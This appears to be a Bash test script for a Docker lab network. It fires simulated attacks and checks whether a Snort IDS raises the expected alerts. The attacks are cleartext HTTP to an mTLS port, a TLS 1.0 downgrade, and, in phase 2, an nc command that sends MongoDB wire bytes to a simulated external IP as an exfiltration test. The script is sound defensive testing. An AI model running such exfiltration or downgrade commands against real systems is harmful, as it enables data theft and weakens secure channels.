#!/bin/bash
# =============================================================================
# MARITIME ZTA - PRUEBAS DE EXFILTRACIÓN Y ANOMALÍAS CRIPTOGRÁFICAS (CAT 3 & 5)
# =============================================================================
export MSYS_NO_PATHCONV=1
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
REPORT_FILE="resultado_exfiltracion.txt"

echo "=======================================================================" > "$REPORT_FILE"
echo " MARITIME ZTA - REPORTE DE EXFILTRACIÓN Y CRIPTOGRAFÍA" >> "$REPORT_FILE"
echo " Fecha de ejecución: $(date '+%Y-%m-%d %H:%M:%S')" >> "$REPORT_FILE"
echo "=======================================================================" >> "$REPORT_FILE"

header() {
    echo -e "\n${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE} $1${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "\n--- $1 ---" >> "$REPORT_FILE"
}

fire_attack() {
    local source_container=$1
    local attack_desc=$2
    local command=$3
    local expected_sid=$4

    local start_time=$(date '+%H:%M:%S')
    echo -e "${YELLOW}► [${start_time}] DESDE [${source_container}]: ${attack_desc}${NC}"

    docker exec "$source_container" sh -c "$command" >/dev/null 2>&1 || true
    sleep 2

    local end_time=$(date '+%H:%M:%S')

    if docker exec ids_network_monitor sh -c "grep -q ':${expected_sid}:' /var/log/snort/alert_json.txt 2>/dev/null"; then
        echo -e "${GREEN}   [✔] DETECTADO a las ${end_time} (SID: $expected_sid)${NC}"
        echo "[✔ DETECTADO] $attack_desc (SID: $expected_sid) - Detectado a las $end_time" >> "$REPORT_FILE"
    else
        echo -e "${RED}   [✘] FALLO a las ${end_time} (Snort NO detectó el SID $expected_sid)${NC}"
        echo "[✘ FALLO] $attack_desc (SID: $expected_sid) - Snort ciego ante este evento" >> "$REPORT_FILE"
    fi
}

docker exec ids_network_monitor sh -c "> /var/log/snort/alert_json.txt"
echo -e "Limpiando buffer de Snort para análisis de payload..."
sleep 2

header "FASE 1: ANOMALÍAS EN CANAL SEGURO mTLS (CAT 3)"

# SID 1000011: HTTP GET cleartext en puerto HTTPS
fire_attack "client_intruso" "Violación Política: Petición HTTP plana en puerto mTLS (GET)" "curl -s http://172.20.13.7:8443" "1000011"

# SID 1000012: HTTP POST cleartext en puerto HTTPS
fire_attack "client_intruso" "Violación Política: Petición HTTP plana en puerto mTLS (POST)" "curl -s -X POST http://172.20.13.7:8443" "1000012"

# SID 1000013: TLS Downgrade (Intento de forzar un cifrado débil antiguo)
fire_attack "client_intruso" "Degradación criptográfica (TLS 1.0 Downgrade)" "curl -k -s --tls-max 1.0 https://172.20.13.7:8443" "1000013"

header "FASE 2: EXFILTRACIÓN DE DATOS (CAT 5)"

# SID 1000020: Exfiltración de MongoDB
fire_attack "client_soc_admin" "Exfiltración: Tráfico de Mongo Wire hacia IP externa simulada" "echo -ne '\xd4\x07\x00\x00' | nc -w 1 172.20.10.11 80" "1000020"

header "REPORTE GENERADO"
echo -e "${GREEN}✔ El test ha finalizado. Los resultados se han guardado en: ${NC}$(pwd)/${REPORT_FILE}"
echo "=======================================================================" >> "$REPORT_FILE"
echo " FIN DEL REPORTE" >> "$REPORT_FILE"
